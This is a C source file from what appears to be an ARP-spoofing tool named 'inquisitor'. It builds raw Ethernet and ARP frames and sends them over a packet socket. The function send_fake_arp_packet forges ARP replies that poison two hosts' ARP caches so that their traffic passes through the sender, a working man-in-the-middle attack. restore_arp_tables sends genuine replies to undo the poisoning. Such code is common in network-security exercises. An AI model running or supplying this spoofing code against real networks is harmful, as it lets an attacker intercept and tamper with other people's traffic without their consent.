#include "../inc/inquisitor.h"

void base_init_packet(t_packet *packet) {
  memset(packet, 0, sizeof(*packet));
  packet->ar_hrd = htons(HW_TYPE_ETHERNET);
  packet->ar_pro = htons(ETH_P_IP);
  packet->ar_hln = LEN_HW_ETHERNET;
  packet->ar_pln = LEN_PROTO_IPV4;
  packet->ar_op = htons(ARPOP_REPLY);
}

void fill_field_packet(t_inquisitor *inquisitor, t_packet *packet, const int8_t *source_ip, const int8_t *target_ip, const int8_t *target_mac) {
  uint32_t tmp_int;
  char *source_mac = inquisitor->ifr.ifr_hwaddr.sa_data;
  memcpy(packet->ar_sha, source_mac, 6); //my mac address
  tmp_int = inet_addr((const char *) source_ip);
  memcpy(packet->ar_sip, &tmp_int, 4); //src ip target
  memcpy(packet->ar_tha, target_mac, 6); //target mac address
  tmp_int = inet_addr((const char *) target_ip);
  memcpy(packet->ar_tip, &tmp_int, 4); //target ip address
}

void init_ether_frame(ethernet_frame *frame, t_packet *packet) {
  memset(frame, 0, sizeof(*frame));
  //init preamble and sfd to help with synchronization
  memcpy(frame->dest_addr, packet->ar_tha, 6);
  memcpy(frame->src_addr, packet->ar_sha, 6);
  *(uint16_t *) frame->ethertype = htons(ETH_P_ARP);
  memcpy(frame->data, (uint8_t *) packet, sizeof(*packet));
}

static void init_dest_sock(struct sockaddr_ll *dest, t_inquisitor *inquisitor) {
  memset(dest, 0, sizeof(*dest));
  dest->sll_family = AF_PACKET;
  dest->sll_protocol = htons(ETH_P_ARP);
  dest->sll_ifindex = (int32_t) inquisitor->index;
  dest->sll_hatype = htons(ARPHRD_ETHER);
  dest->sll_halen = ETH_ALEN;
  dest->sll_pkttype = PACKET_OTHERHOST;
}

void send_fake_arp_packet(t_inquisitor *inquisitor, uint32_t dest) {
  t_packet packet;
  ethernet_frame frame;
  struct sockaddr_ll dest_addr;
  ssize_t byte_sent;

  base_init_packet(&packet);
  if (dest == 1)
    fill_field_packet(inquisitor, &packet, inquisitor->ip_src, inquisitor->ip_target,inquisitor->mac_target_byte_arr);
  else if (dest == 2)
    fill_field_packet(inquisitor, &packet, inquisitor->ip_target, inquisitor->ip_src, inquisitor->mac_src_byte_arr);
  init_ether_frame(&frame, &packet);
  init_dest_sock(&dest_addr, inquisitor);
  dest_addr.sll_pkttype = PACKET_OUTGOING;
  byte_sent = sendto(inquisitor->sock, &frame, sizeof(frame), 0, (struct sockaddr *) &dest_addr,sizeof(dest_addr));
  if (byte_sent == -1)
    error("sendto", NULL, __FILE__, __LINE__, __func__);
  dprintf(1, GREEN "LOG: %ld bytes sent\n" RESET, byte_sent);
  dprintf(1, GREEN "LOG: Spoofed ARP Packet sent to %s!\n\n" RESET, dest == 1 ? inquisitor->mac_target : inquisitor->mac_src);
}

void restore_arp_tables(t_inquisitor *inquisitor, uint32_t dest) {
  t_packet packet;
  ethernet_frame frame;
  struct sockaddr_ll dest_addr;
  ssize_t byte_sent;

  base_init_packet(&packet);
  if (dest == 1) {
    fill_field_packet(inquisitor, &packet, inquisitor->ip_src, inquisitor->ip_target, inquisitor->mac_target_byte_arr);
    memcpy(packet.ar_sha, inquisitor->mac_src_byte_arr, 6);
  } else if (dest == 2) {
    fill_field_packet(inquisitor, &packet, inquisitor->ip_target, inquisitor->ip_src, inquisitor->mac_src_byte_arr);
    memcpy(packet.ar_sha, inquisitor->mac_target_byte_arr, 6);
  }
  init_ether_frame(&frame, &packet);
  init_dest_sock(&dest_addr, inquisitor);
  dprintf(1, "HEXDUMP ARP PACKET\n");
  hexdump(&frame, sizeof (frame), sizeof(frame));
  byte_sent = sendto(inquisitor->sock, &frame, sizeof(frame), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
  if (byte_sent == -1)
    error("sendto", NULL, __FILE__, __LINE__, __func__);
  dprintf(1, GREEN "LOG: %ld bytes sent\n" RESET, byte_sent);
  dprintf(1, GREEN "LOG: Spoofed ARP Packet send to %s!\n\n" RESET, dest == 1 ? inquisitor->mac_target : inquisitor->mac_src);
}